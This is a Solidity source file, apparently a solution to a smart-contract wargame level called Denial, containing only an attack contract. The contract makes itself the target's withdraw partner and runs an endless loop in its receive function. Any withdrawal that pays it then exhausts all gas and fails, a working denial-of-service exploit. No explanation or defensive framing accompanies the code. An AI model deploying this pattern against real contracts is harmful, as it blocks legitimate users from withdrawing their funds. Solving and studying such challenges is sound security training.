// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address) external;
    function withdraw() external;
}

contract Attack {
    IDenial target;

    constructor(address targetAddr) {
        target = IDenial(targetAddr);
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true) {
            
        }
    }
}
